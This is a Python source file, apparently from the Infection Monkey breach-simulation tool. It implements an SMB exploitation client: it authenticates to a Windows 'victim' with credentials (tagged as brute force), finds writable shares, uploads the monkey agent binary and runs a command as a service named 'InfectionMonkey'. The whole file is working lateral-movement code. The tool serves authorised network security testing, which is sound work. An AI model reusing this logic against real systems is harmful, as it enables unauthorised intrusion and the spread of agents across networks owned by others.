import logging

# import ntpath
from io import BytesIO
from pathlib import PurePath, PureWindowsPath
from typing import List, Optional, Set, Tuple, Type

from common import OperatingSystem
from common.credentials import Credentials
from common.tags import (
    T1021_ATTACK_TECHNIQUE_TAG,
    T1105_ATTACK_TECHNIQUE_TAG,
    T1110_ATTACK_TECHNIQUE_TAG,
    T1135_ATTACK_TECHNIQUE_TAG,
    T1210_ATTACK_TECHNIQUE_TAG,
    T1569_ATTACK_TECHNIQUE_TAG,
)
from common.types import NetworkPort
from infection_monkey.exploit.tools import (
    IRemoteAccessClient,
    RemoteAuthenticationError,
    RemoteCommandExecutionError,
    RemoteFileCopyError,
)
from infection_monkey.i_puppet import TargetHost

from .smb_client import ShareInfo, SMBClient
from .smb_options import SMBOptions

logger = logging.getLogger(__name__)

SERVICE_NAME = "InfectionMonkey"
LOGIN_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1110_ATTACK_TECHNIQUE_TAG,  # Brute Force
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
}
COPY_FILE_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1105_ATTACK_TECHNIQUE_TAG,  # Ingress Tool Transfer
    T1135_ATTACK_TECHNIQUE_TAG,  # Network Share Discovery
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
}
EXECUTION_TAGS = {
    T1021_ATTACK_TECHNIQUE_TAG,  # Remote Services
    T1210_ATTACK_TECHNIQUE_TAG,  # Exploitation of Remote Services
    T1569_ATTACK_TECHNIQUE_TAG,  # Execution: System Services
}
SMB_PORTS = [NetworkPort(139), NetworkPort(445)]


# Should this just be a variable?
class CopiedFileDetails:
    """Stores the details of a copied file"""

    def __init__(self, destination_path: PurePath):
        self.destination_path = destination_path


class SMBExploitClient(IRemoteAccessClient):
    """Manages the SMB connection, Exploitation events"""

    def __init__(
        self,
        host: TargetHost,
        options: SMBOptions,
        smb_client: SMBClient = SMBClient(),
    ):
        self._host = host
        self._options = options
        self._copied_file_details: Optional[CopiedFileDetails] = None
        self._authenticated_credentials: Optional[Credentials] = None
        self._smb_client = smb_client
        self._destination_path: Optional[PurePath] = None

    def login(self, credentials: Credentials, tags: Set[str]):
        tags.update(LOGIN_TAGS)

        try:
            self._smb_client.connect_with_user(
                self._host, credentials, timeout=self._options.smb_connect_timeout
            )
        except Exception as err:
            error_message = f"Failed to authenticate over SMB with {credentials}: {err}"
            raise RemoteAuthenticationError(error_message)

        self._authenticated_credentials = credentials

    def _raise_if_not_authenticated(self, error_type: Type[Exception]):
        if self._authenticated_credentials is None:
            raise error_type(
                "This operation cannot be performed until authentication is successful"
            )

    def get_os(self) -> OperatingSystem:
        return OperatingSystem.WINDOWS

    def execute_detached(self, command: str, tags: Set[str]):
        self._raise_if_not_authenticated(RemoteCommandExecutionError)

        try:
            tags.update(EXECUTION_TAGS)
            self._smb_client.run_service(
                SERVICE_NAME,
                command,
                self._host,
                SMB_PORTS,
                self._authenticated_credentials,
                self._options.smb_connect_timeout,
            )
        except Exception as err:
            raise RemoteCommandExecutionError(err)

    def copy_file(self, file: bytes, destination_path: PurePath, tags: Set[str]):
        self._raise_if_not_authenticated(RemoteFileCopyError)

        self._destination_path = destination_path
        tags.update((T1021_ATTACK_TECHNIQUE_TAG, T1210_ATTACK_TECHNIQUE_TAG))

        tags.add(T1135_ATTACK_TECHNIQUE_TAG)

        logger.debug(
            f"Trying to copy monkey file to [{destination_path}] on victim {self._host.ip}"
        )

        # 1. I accept a local path
        # 2. I query for shares on the remote machine
        # 3. I check to see if the local path is a subpath of any of the shares
        #   a. If it is, I copy the file to the share
        for share in self._query_shares(destination_path):
            if not str(destination_path).lower().startswith(share.path.lower()):
                continue

            clean_destination = PureWindowsPath(str(destination_path)[len(share.path) :])
            logger.debug(f"Clean destination: {clean_destination}")
            try:
                self._connect_to_share(share)
                file_io = BytesIO(file)
                self._smb_client.set_timeout(self._options.agent_binary_upload_timeout)
                tags.add(T1105_ATTACK_TECHNIQUE_TAG)

                self._smb_client.send_file(share.name, str(clean_destination), file_io.read)

                logger.info(
                    f"Copied monkey agent to remote share '{share.name}' "
                    f"[{share.path}] on victim {self._host.ip}"
                )

                self._copied_file_details = CopiedFileDetails(
                    # PurePath(ntpath.join(share.path, destination_path.strip(ntpath.sep))),
                    clean_destination,
                )
                return
            except Exception as err:
                error_message = (
                    f"Error uploading monkey to share '{share.name}' "
                    f"on victim {self._host.ip}: {err}"
                )
                logger.error(error_message)
                raise RemoteFileCopyError(error_message)
        raise RemoteFileCopyError("No writable shares found")

    def _connect_to_share(self, share: ShareInfo):
        """
        Gets the SMB share

        :param share: The share to connect to
        :raise Exception: If the share cannot be connected to
        """

        # TODO: Do we really need to handle reconnects?
        if not self._smb_client.connected():
            self._raise_if_not_authenticated(RemoteFileCopyError)
            try:
                self._smb_client.connect_with_user(
                    self._host, self._authenticated_credentials, self._options.smb_connect_timeout
                )
            except Exception as err:
                raise RemoteFileCopyError(f"Not connected: {err}")

        try:
            self._smb_client.connect_to_share(share.name)
        except Exception as err:
            logger.error(
                f'Error connecting tree to share "{share.path}" on victim {self._host.ip}: {err}'
            )
            raise RemoteFileCopyError(err)

    def get_writable_paths(self) -> List[PurePath]:
        # 1. I query for shares on the remote machine
        # 2. I output the local paths for each share
        if self._destination_path:
            logger.debug("Retrieving writable paths")

            writable_paths = [
                # TODO: Why are we casting this?
                PurePath(PureWindowsPath(info.path))
                for info in self._query_shares(self._destination_path)
            ]
            return writable_paths
        return []

    def _query_shares(self, path: PurePath) -> Tuple[ShareInfo, ...]:
        """
        Queries the host for SMB shares.

        :param path: An SMB shares path
        :return: A tuple consisting of share name and info pairs
        """
        high_priority_shares: Tuple[ShareInfo, ...] = ()
        low_priority_shares: Tuple[ShareInfo, ...] = ()

        for share in self._smb_client.query_shared_resources():
            if share.current_uses >= share.max_uses:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host.ip} because max uses is exceeded",
                )
                continue
            elif not share.path:
                logger.debug(
                    f"Skipping share '{share.name}' on victim "
                    f"{self._host.ip} because share path is invalid",
                )
                continue

            if str(path).lower().startswith(share.path.lower()):
                high_priority_shares += (share,)

            low_priority_shares += (share,)

        return high_priority_shares + low_priority_shares
